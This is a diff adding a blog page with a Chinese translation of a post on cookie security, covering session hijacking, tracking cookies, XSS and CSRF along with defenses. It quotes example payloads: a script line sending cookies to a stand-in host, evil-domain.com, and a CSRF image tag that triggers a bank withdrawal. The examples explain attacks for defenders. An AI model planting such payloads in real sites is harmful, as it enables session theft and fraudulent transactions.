@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><meta name="generator" content="Hexo 3.8.0">
+    
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+<meta name="theme-color" content="#f8f5ec">
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+
+  <meta name="description" content="Cookies and security(译)">
+
+
+
+
+  <meta name="keywords" content="cookie, Deskid's Blog">
+
+
+
+
+
+  <meta name="google-site-verification" content="UA-110544275-1">
+
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Deskid's Blog">
+
+
+
+
+
+
+<link rel="canonical" href="https://deskid.github.io/2017/11/26/cookies-and-security/">
+
+
+
+  <link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css">
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/lib/nprogress/nprogress.min.css">
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.10.1">
+
+
+
+  
+
+
+
+  <script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+
+
+
+
+
+
+
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":true};
+</script>
+
+    <title> Cookies and security(译) - Deskid's Blog </title>
+  </head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Deskid's Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    
+      <a href="/">
+        <li class="mobile-menu-item">
+          
+          
+            Home
+          
+        </li>
+      </a>
+    
+      <a href="/archives/">
+        <li class="mobile-menu-item">
+          
+          
+            Archives
+          
+        </li>
+      </a>
+    
+      <a href="/tags">
+        <li class="mobile-menu-item">
+          
+          
+            Tags
+          
+        </li>
+      </a>
+    
+      <a href="/categories">
+        <li class="mobile-menu-item">
+          
+          
+            Categories
+          
+        </li>
+      </a>
+    
+      <a href="/about">
+        <li class="mobile-menu-item">
+          
+          
+            About
+          
+        </li>
+      </a>
+    
+  </ul>
+</nav>
+
+    <div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Deskid's Blog</a>
+</div>
+
+<nav class="site-navbar">
+  
+    <ul id="menu" class="menu">
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/">
+            
+            
+              Home
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            
+            
+              Archives
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/tags">
+            
+            
+              Tags
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/categories">
+            
+            
+              Categories
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/about">
+            
+            
+              About
+            
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+
+      </header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content">
+            
+  
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          Cookies and security(译)
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2017-11-26
+        </span>
+        
+          <span class="post-category">
+            
+              <a href="/categories/Web前端/">Web前端</a>
+            
+          </span>
+        
+        
+      </div>
+    </header>
+
+    
+    
+  <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#user-logins-and-session-hijacking"><span class="toc-text">User logins and session hijacking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#third-party-cookies"><span class="toc-text">Third-party cookies</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cookie-stealing-and-xss"><span class="toc-text">Cookie stealing and XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cross-site-request-forgery-csrf"><span class="toc-text">Cross-site request forgery (CSRF)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#conclusion"><span class="toc-text">Conclusion</span></a></li></ol>
+    </div>
+  </div>
+
+
+
+    <div class="post-content">
+      
+        <p>Posted at May 12, 2009 by Nicholas C. Zakas<br>
+<a href="https://www.nczonline.net/blog/2009/05/12/cookies-and-security/" target="_blank" rel="noopener">原文</a></p>
+<p>事实上关于cookie的安全策略有很多，cookie本身和安全相关的属性有 <code>domain</code>, <code>path</code>, and <code>secure</code>, 但是由于网页的天性使得cookie安全变得更加复杂。</p>
+<a id="more"></a>
+<h2 id="user-logins-and-session-hijacking">User logins and session hijacking</h2>
+<p>cookie最常见的一种用途是跟踪login状态。</p>
+<p>服务端在校验通过登录账号和密码后返回的cookie中记录了能标识当前用户的信息。同站的其他请求都会带上这个cookie来验证登陆状态。大多数站点都是使用的session cookie，在关闭浏览器后cookie就销毁了，也有一些提供了“remember me” 选项，比如提供一星期内不用重新登录的功能。</p>
+<p>使用抓包攻击可以轻易的伪造用户身份，服务端无法分辨身份是否是伪造的。防止session hijacking有以下方法：</p>
+<ol>
+<li>
+<p>上 https，使用 SSL 来传输cookie。</p>
+</li>
+<li>
+<p>在session key中添加更多local或者随机信息，比如 ip，login time，使得伪造cookie更加困难。</p>
+</li>
+<li>
+<p>对于关键操作，要求重新验证用户信息。比如支付、修改密码等等</p>
+</li>
+</ol>
+<!-- more -->
+<h2 id="third-party-cookies">Third-party cookies</h2>
+<p>网页上往往会引用外部站点上的资源，比如css，script，iframe等。</p>
+<p>在访问外部站点时，本域下的cookie不会被发送；同时，本域也无法访问外部站点返回的cookie</p>
+<ul>
+<li>Using a <code>&lt;link&gt;</code> tag to include a style sheet.</li>
+<li>Using a <code>&lt;script&gt;</code> tag to include a JavaScript file.</li>
+<li>Using an <code>&lt;object&gt;</code> or tag to include media files.</li>
+<li>Using an <code>&lt;iframe&gt;</code> tag to include another HTML file.</li>
+</ul>
+<p>外部返回的cookie有啥用呢？</p>
+<p>假设 Page A 访问了一个外部链接，第三方服务器返回一个记录了 <code>Referer</code> 的cookie，Page B 这时也访问该外部链接，这个cookie就会被发给第三方服务器，从而暴露了用户的访问记录。第三方服务器就知道了用户访问了Page A又访问了Page B，而仅仅根据这些信息就可以做一些广告推荐。</p>
+<p>这些 cookies 被称为 tracking cookies。当然这些也不太可能会造成安全威胁，但是这个概念在更大规模的安全领域讨论中很重要。</p>
+<h2 id="cookie-stealing-and-xss">Cookie stealing and XSS</h2>
+<p>加载一个第三方域名下的JavaScript有巨大的安全隐患。 尽管在请求第三方 JavaScript 资源时不会发送本域名下的cookie，但是script还是可以读取到cookie。同一页面下的所有的JavaScript都被认为是运行在同一个domain、path、protocol下。这时访问<code>document.cookie</code>即可获取到cookie了。</p>
+<p>举个例子说明：</p>
+<p>页面A从第三方站点<code>evil-domain.com</code>加载了某个JavaScript，上线之后<code>evil-domain.com</code> 将该JavaScript改为如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(new Image()).src = &quot;http://www.evil-domain.com/cookiestealer.php?cookie=&quot; + cookie.domain;</span><br></pre></td></tr></table></figure>
+<p>页面A下的cookie就这样被静默的发送给了<code>evil-domain.com</code>。</p>
+<p>这种注入第三方的JavaScript的攻击方式也叫做XSS(cross-site scripting)攻击。</p>
+<p>除了不小心include了一个可疑的script之外，XSS攻击还有可能是因为没有做输入过滤。</p>
+<p>比如这个<a href="http://www.steve.org.uk/Hacks/XSS/simple.html" target="_blank" rel="noopener">网站</a>会将用户的的输入显示在网页上，当用户输入如下内容，cookie同样也会被盗取</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">(new Image()).src = &quot;http://www.evil-domain.com/cookiestealer.php?cookie=&quot; + cookie.domain;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>防止XSS：</p>
+<ol>
+<li>不要随便 include 来自可疑域名的 JavaScript；尽量选择大公司的CDN；</li>
+<li>总是过滤或者sanitize用户的输入，不要直接输出用户的输入。</li>
+</ol>
+<p>HTTP-only cookies 是cookie标准的重要补充，script无法通过<code>document.cookie</code>读取被标记为 HTTP-only 的cookie。(注：目前所有的浏览器都实现了该标准)</p>
+<h2 id="cross-site-request-forgery-csrf">Cross-site request forgery (CSRF)</h2>
+<p>另外一种涉及到cookie的攻击是cross-site request forgery(CSRF)。这种攻击工作的原理是欺骗浏览器以用户的身份发送危险请求、例如转账、支付等。这种攻击常常利用XSS技术或者简单的HTML。</p>
+<p>Wikipedia 展示了一个例子：</p>
+<p>在一个没有过滤用户输入的论坛上，发布下面这样的一张图片。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>如果你恰好登录了 <code>bank.example</code> 当你浏览这个帖子时就会发起一个转账请求。</p>
+<p>和预防XSS一样，输入过滤也可以阻止CSRF攻击<br>
+其它的一些预防措施如下:</p>
+<ul>
+<li>对于敏感信息需要重新验证用户身份。</li>
+<li>对于敏感系统，Cookies 的失效时间应尽可能的短。</li>
+<li>不仅验证cookies，还要验证referer 或者 request type (POST instead of GET).</li>
+</ul>
+<p>由于CSRF攻击一旦触发很难排查，所以预防是关键。</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>虽然列举了这么多关于cookie的安全攻击方式，但是，只要采取了合适的预防措施，使用cookie是安全的。</p>
+<p>单单验证用户输入这个举措，就可以显著降低攻击数量，而且是一个低成本，高回报的预防措施，</p>
+<p>最总要的是保持关注安全问题，紧跟最新技术防止攻击。</p>
+
+      
+    </div>
+
+    
+      
+      
+
+  <div class="post-copyright">
+    <p class="copyright-item">
+      <span>Author: </span>
+      <a href="https://deskid.github.io">deskid</a>
+    </p>
+    <p class="copyright-item">
+      <span>Link: </span>
+      <a href="https://deskid.github.io/2017/11/26/cookies-and-security/">https://deskid.github.io/2017/11/26/cookies-and-security/</a>
+    </p>
+    <p class="copyright-item">
+      <span>License: </span>
+      
+      <a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
+    </p>
+  </div>
+
+
+
+      
+      
+    
+
+    
+      <footer class="post-footer">
+        
+          <div class="post-tags">
+            
+              <a href="/tags/cookie/">cookie</a>
+            
+          </div>
+        
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2017/11/27/JavaScript-代码优化/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">JavaScript 代码优化(译)</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2017/09/07/kotlin-learn-notes-4/">
+        <span class="next-text nav-default">kotlin 深入学习笔记(四)</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+
+      </footer>
+    
+
+  </article>
+
+
+          </div>
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+      </main>
+
+      <footer id="footer" class="footer">
+
+  <div class="social-links">
+    
+      
+        
+          <a href="mailto:deskidzhou@gmail.com" class="iconfont icon-email" title="email"></a>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        
+          <a href="https://github.com/deskid" class="iconfont icon-github" title="github"></a>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+
+    
+      <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    
+  </div>
+
+
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">
+    
+    &copy; 
+     
+      2015 - 
+    
+    2018
+
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">deskid</span>
+  </span>
+</div>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+
+    
+  
+  <script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'https://deskid.github.io/2017/11/26/cookies-and-security/';
+        this.page.identifier = '2017/11/26/cookies-and-security/';
+        this.page.title = 'Cookies and security(译)';
+    };
+    (function() {
+    var d = document, s = d.createElement('script');
+
+    s.src = '//deskid.disqus.com/embed.js';
+
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();  
+  </script>
+
+  
+
+  
+
+
+
+    
+  
+
+
+
+  
+  
+
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  
+
+  
+    <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  
+
+  
+    <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  
+
+  
+    <script type="text/javascript" src="/lib/pjax/jquery.pjax.min.js"></script>
+  
+
+  
+    <script type="text/javascript" src="/lib/nprogress/nprogress.min.js"></script>
+  
+
+
+    <script type="text/javascript" src="/js/src/even.js?v=2.10.1"></script>
+
+  </body>
+</html>
